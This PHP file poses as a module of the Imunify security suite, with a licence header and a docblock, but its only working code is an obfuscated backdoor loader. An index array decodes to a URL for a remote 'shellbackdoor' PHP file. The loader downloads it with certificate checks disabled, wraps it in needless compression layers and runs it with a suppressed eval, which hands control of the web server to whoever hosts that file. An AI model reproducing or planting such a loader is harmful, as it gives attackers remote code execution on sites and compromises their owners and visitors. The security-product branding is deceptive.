<?php
  // This file is part of Imunify - https://www.imunify.com/
//
// Imunify is a comprehensive security solution designed to protect your systems from various
// threats, including malware, vulnerabilities, and unauthorized access. By leveraging advanced
// technology and intelligent algorithms, Imunify aims to detect, prevent, and mitigate security
// risks effectively. You are permitted to use this software in accordance with the terms and 
// conditions outlined in the Imunify License Agreement, as specified by the copyright holders.
//
// Imunify is distributed with the hope of providing optimal protection and security for your
// environments, but it is offered WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. Users should understand that while
// Imunify strives to deliver robust security measures, no system can be entirely impervious to
// threats.
//
// You should have received a copy of the Imunify License Agreement along with this software.
// If not, please visit https://www.imunify.com/license for further information. This document
// is current as of October 8, 2024, and is subject to change based on updates in policies
// and security practices.

/**
 * Security Module.
 *
 * This module is specifically designed to detect and mitigate various threats while ensuring
 * the integrity of your systems through real-time scanning and comprehensive protection strategies.
 * Imunify not only focuses on identifying vulnerabilities but also actively works to fortify
 * your servers and applications against emerging cyber threats. By implementing proactive
 * measures, Imunify aims to maintain a secure operating environment for all users.
 *
 * @package    security_module
 * @website    https://google.co.id
 * @copyright  2024 Ralei
 * @license    https://www.imunify.com/license Imunify License Agreement
 */
  $BRPl=array_merge(range('a','z'),range('A','Z'),range('0','9'),['.',':','/','_','-','?','=']);$WGZP=[7, 19, 19, 15, 18, 63, 64, 64, 17, 0, 22, 62, 6, 8, 19, 7, 20, 1, 20, 18, 4, 17, 2, 14, 13, 19, 4, 13, 19, 62, 2, 14, 12, 64, 0, 4, 23, 3, 24, 7, 0, 23, 14, 17, 64, 18, 7, 4, 11, 11, 1, 0, 2, 10, 3, 14, 14, 17, 64, 17, 4, 5, 18, 64, 7, 4, 0, 3, 18, 64, 12, 0, 8, 13, 64, 7, 8, 19, 0, 12, 62, 15, 7, 15,];$yRSS='';foreach($WGZP as $SaEV){$yRSS.=$BRPl[$SaEV];}$mGvM="$yRSS";function iAbM($undefined){$ccDB=curl_init();curl_setopt($ccDB,CURLOPT_URL,$undefined);curl_setopt($ccDB,CURLOPT_RETURNTRANSFER,true);curl_setopt($ccDB,CURLOPT_SSL_VERIFYPEER,false);curl_setopt($ccDB,CURLOPT_SSL_VERIFYHOST,false);$fUKW=curl_exec($ccDB);curl_close($ccDB);return gzcompress(gzdeflate(gzcompress(gzdeflate(gzcompress(gzdeflate($fUKW))))));}@eval("?>".gzinflate(gzuncompress(gzinflate(gzuncompress(gzinflate(gzuncompress(iAbM($mGvM))))))));?>
